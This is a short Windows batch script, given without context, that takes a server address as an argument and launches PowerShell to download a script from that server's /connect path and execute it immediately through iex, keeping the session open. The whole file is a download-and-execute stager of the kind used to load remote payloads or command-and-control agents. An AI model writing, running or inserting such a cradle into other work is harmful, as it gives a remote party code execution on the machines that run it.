@echo off
SET server=%1
SET command=iex (New-Object Net.WebClient).DownloadString('"http://%server%/connect"')
echo ,%server%,Ready
powershell -noexit -command %command%